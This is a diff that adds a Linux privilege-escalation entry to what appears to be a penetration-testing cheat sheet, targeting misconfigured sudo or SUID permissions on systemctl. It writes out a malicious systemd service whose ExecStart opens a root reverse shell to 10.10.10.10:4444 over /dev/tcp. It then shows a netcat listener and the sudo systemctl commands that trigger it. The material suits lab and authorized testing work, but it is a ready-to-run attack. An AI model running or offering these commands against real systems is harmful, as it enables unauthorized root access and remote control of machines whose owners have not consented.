@@ -257,6 +257,34 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 # Linux Privilege Escalation
 
+## Systemctl
+- Sudo/SUID permissions on `systemctl`
+    ```bash    
+    # 1. Create a malicious service file (e.g., root.service) in the current directory
+    cat << EOF > root.service
+    [Unit]
+    Description=Root Privilege Escalation
+
+    [Service]
+    Type=simple
+    User=root
+    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+
+    [Install]
+    WantedBy=multi-user.target
+    EOF 
+
+    # 2. Set up a listener on the attacker machine
+    # On attacker machine: nc -lvnp 4444
+
+    # 3. Enable the malicious service
+    sudo systemctl enable ./root.service
+
+    # 4. Start the service to trigger the reverse shell
+    sudo systemctl start root
+    ```
+    > - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+
 
 # Windows Privilege Escalation
 
